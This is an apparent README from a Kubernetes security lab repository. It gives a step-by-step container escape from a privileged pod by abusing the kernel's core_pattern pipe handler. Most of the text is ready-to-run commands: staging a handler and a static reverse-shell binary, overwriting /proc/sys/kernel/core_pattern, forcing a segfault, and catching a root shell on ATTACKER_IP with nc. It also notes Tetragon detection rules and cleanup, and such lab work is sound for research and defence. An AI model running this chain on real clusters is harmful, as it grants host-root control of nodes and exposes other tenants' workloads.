# core_pattern usermodehelper container escape

> **Disclaimer.** Authorized security research/testing only. This executes a
> process as **root on the host** of the node where the target pod runs. Run it
> **only** on a lab cluster you own.

## Starting point — what you already have

Exactly the same foothold as
[`01-privileged-workload-scenario`](../01-privileged-workload-scenario/):
**exec rights into a pod on the node** (cluster-admin kubeconfig, a
`pods/exec` credential, or any compromised workload). The target pod only
needs one property: **`privileged: true`**.

> The two scenarios are independent. 01 uses `mount`+`chroot` (filesystem
> primitive). This one never touches the disk — it makes the **kernel
> execute code for us** via the core-dump pipe handler, and we land directly
> as host root.

## Tested on

- OS: Ubuntu 22.04.5 LTS, x86_64
- Kernel: `5.15.0-173-generic`
- Kubernetes: `v1.28.15` (kubeadm, control-plane `k8s-master22`)
- Container runtime: containerd `1.7.27`
- Target checked: `calico-node` (privileged + hostNetwork DaemonSet)

## What this targets

Any `privileged: true` workload. No `hostPID`, no `hostPath`, no extra
capabilities needed — verified against **calico-node**, but the same chain
works on any privileged pod (CNI agents, logging/security agents, custom
telemetry). See `01-privileged-workload-scenario` for that list.

## How it works

1. **`core_pattern` is a global, non-namespaced sysctl.** A privileged pod's
   `/proc/sys` is mounted read-write, so `echo '|/path/handler' >
   /proc/sys/kernel/core_pattern` changes the setting for the **whole node**.
2. When any process on the node crashes with a core dump enabled, the kernel
   opens the pipe and runs `/path/handler` **as host root, in the init
   namespaces** (`call_usermodehelper`).
3. Our handler therefore needs to exist at a path the **host root filesystem**
   can see. The container's writable layer is the overlayfs upperdir under
   `/var/lib/containerd/.../snapshots/<id>/fs` — files we write inside the pod
   land there, so we stage the handler in the pod and reference it by its
   full host path.
4. The handler drains the incoming core dump, then hands over to a static
   reverse-shell binary (`.revsh`) — modern images/hosts ship no `nc` and no
   `/dev/tcp`, so we bring our own: raw syscalls, static build, zero deps.

```text
   container (privileged pod)
        │
        │  echo '|/host/visible/path' > /proc/sys/kernel/core_pattern
        ▼
   kernel core_pattern  (global sysctl — whole node!)
        │
        │  any process segfaults (ulimit -c unlimited)
        ▼
   kernel: call_usermodehelper(handler)   ← host root, init namespaces
        │
        ▼
   handler drains core dump → exec .revsh → reverse shell to attacker
```

> **Level 1 = trigger** — the crash fires the handler on the host (proof file
> in `/root`). **Level 2 = shell** — the handler connects back and hands you a
> host-root shell. Both are in the same step here; the proof file lets you
> verify even without the listener running.

## Why a privileged pod is enough

The pod `securityContext` plus containerd's OCI bundle decide everything:

| Mechanism | Normal pod | `privileged: true` pod |
|---|---|---|
| `/proc/sys` mount | remounted **read-only** (`linux.readonlyPaths` includes `/proc/sys`) | left read-write |
| proc masking | 10 `maskedPaths` | none |
| capabilities | 14 default caps, no `CAP_SYS_ADMIN` | all caps (41 bounding) |
| AppArmor | `cri-containerd.apparmor.d` | unconfined |

So the **only hard requirement is `privileged: true`** — it is what makes the
pod's `/proc/sys` writable, and `core_pattern` being a non-namespaced sysctl
is what turns a pod-local write into a node-wide effect.

## Prereqs

```sh
# 1. tools on your box: kubectl, jq, gcc, base64, curl
command -v kubectl jq gcc base64 curl

# 2. cluster reachable + foothold (same as scenario 01)
export KUBECONFIG=/path/admin.conf
kubectl cluster-info
kubectl auth can-i create pods/exec -n kube-system   # must print "yes"

# 3. a listener on YOUR box for the reverse shell (nc/ncat/socat or python3)
command -v nc ncat socat || python3 -c 'import socket; print("python3 listener OK")'
```

## How to use

**0. Find your target** (any privileged pod)

```sh
bash ../find-privileged-pods.sh          # pick any row with privileged=true
POD=kube-system/calico-node-sd7hd       # the concrete example below
```

**1. Build the reverse-shell helper**

```sh
cd helpers && make -s && ls -la revsh   # static binary, no deps
```

**2. Stage handler + helper into the pod** (both land on the host-visible
overlay upperdir)

```sh
cd ..                                   # back in 02-core-pattern-scenario/
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c 'cat > /tmp/.x-handler' < handlers/handler.sh
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c 'cat > /tmp/.revsh'    < helpers/revsh
# calico ships no chmod — coreutils provides it:
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c '/usr/bin/coreutils --coreutils-prog=chmod 755 /tmp/.x-handler /tmp/.revsh && ls -la /tmp/.x*'
```

**3. Resolve the host-visible path of the staged files** (overlay upperdir)

```sh
UPPER=$(kubectl -n kube-system exec ${POD#*/} -- /bin/bash -c 'sed -n "s/.*upperdir=\([^,]*\).*/\1/p" /proc/mounts | grep snapshots' | head -1)
echo "$UPPER"                            # /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs
HANDLER="$UPPER/tmp/.x-handler"
echo "$HANDLER"
```

> **Verify step 3:** `grep " / overlay" /proc/mounts` inside the pod shows the
> `upperdir=` of the container root; everything you write to `/tmp` in the pod
> is exactly `$UPPER/tmp/...` on the host. (On a node with a `noexec`
> `/var/lib/containerd` mount this stage would silently fail — check
> `/proc/mounts` on the host if the handler never fires.)

**4. Start your listener**

```sh
nc -lvnp 1337                            # or: ncat -lvnp 1337
```

**5. Point the node's core_pattern at the handler**

```sh
ATTACKER_IP=192.168.1.180                # YOUR box, reachable from the node
PORT=1337
# note the pipe, the full host path, and the argv appended after it:
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c "echo '|$HANDLER $ATTACKER_IP $PORT' > /proc/sys/kernel/core_pattern; cat /proc/sys/kernel/core_pattern"
```

> **Verify step 5:** the core_pattern string now starts with `|` and the full
> host path. This is the moment the whole node is made to execute your handler
> on any core dump.

**6. Crash a child process** (core dump enabled)

```sh
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c 'ulimit -c unlimited; kill -s SEGV $$'
# exit code 139 (128+11 SIGSEGV) is EXPECTED
```

> **Some shells ignore SIGSEGV:** if 139 doesn't appear, use a known crasher:
> `python3 -c "import os; os.kill(os.getpid(), 11)"` or kill a `sleep` child.
> Also make sure the crashing process's `RLIMIT_CORE` is `unlimited` — that
> gate decides whether the kernel writes the dump/pipe at all.

**7. Receive the reverse shell**

```text
listener$ nc -lvnp 1337
Connection from <NODE_IP> ...
# root shell ON THE HOST (init namespaces)
hostname; id                          # uid=0(root) — the NODE, not the pod
ls /var/lib/kubelet /root             # host-only paths
cat /root/core-escape-proof           # handler's own proof: fired + id
```

> **Verify step 7:** `hostname` is the **node name**, not the pod, and
> `/root/core-escape-proof` exists — the handler ran as host root.
>
> Example received shell (job-control warnings are normal for a non-tty shell):
> ```text
> bash: cannot set terminal process group (-1)
> bash: no job control in this shell
> root@k8s-worker22:/# id
> uid=0(root) gid=0(root)
> ```
> If output seems missing: `revsh` routes the shell's stdout over its stderr
> socket (`exec 1>&2`) — plain writes to fd 1 can fail with EIO in the
> usermodehelper context.

> **Detection coverage:** `../../policy/core-pattern-escape-detection.yaml`
> has two stages, both in `tag=core-pattern`:
> - `core-pattern-overwrite` — fires the moment step 5 writes the pipe handler
>   (`openat("/proc/sys/kernel/core_pattern", O_WRONLY/O_TRUNC)`), attributed
>   to the caller pod (`kube-system/calico-node-sd7hd`).
> - `core-pattern-exec` — fires when the kernel actually runs the handler
>   (`security_bprm_check` of the staged binary under the containerd overlay
>   upperdir). This catches the *execution* no matter what the payload does.
>
> Both feed the `tetragon-escape-detections` alert rule; the Grafana panel
> "core_pattern escape stages" splits them by the `stage` label, and the
> handler's `process_exec` (host context, binary under the overlay upperdir)
> shows up in the "Host-context processes (init tree)" table.

## Cleanup — restoring the original core_pattern is mandatory

While you are still in the reverse shell (or via SSH to the node as root):

```sh
ORIG='|/usr/share/apport/apport -p%p -s%s -c%c -d%d -P%P -u%u -g%g -F%F -- %E'
echo "$ORIG" > /proc/sys/kernel/core_pattern
cat /proc/sys/kernel/core_pattern     # must show the ORIGINAL value
rm -f "$HANDLER" "$UPPER/tmp/.revsh" /root/core-escape-proof
```

> Without this, **every core dump on the node** would trigger your handler —
> including crashes inside other tenants' containers. Restore immediately.

## Files

- `handlers/handler.sh` — the core_pattern pipe handler (drains dump, writes
  proof, execs .revsh)
- `helpers/revsh.c` + `Makefile` — static reverse-shell helper (drain stdin →
  connect back → dup2 → `/bin/bash -i`, stdout routed over the stderr socket
  for the usermodehelper context) — the `nc`/`/dev/tcp` replacement
- `helpers/revsh` — prebuilt static binary (x86-64, glibc-static)

## Reference

- [core_pattern usermodehelper abuse](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation) — HackTricks Docker breakout (Set core_pattern)
- [call_usermodehelper execution context](https://www.kernel.org/doc/html/latest/core-api/kernel-api.html) — kernel docs
- SCENARIO.md (this repo) — lab context and the rest of the escape chains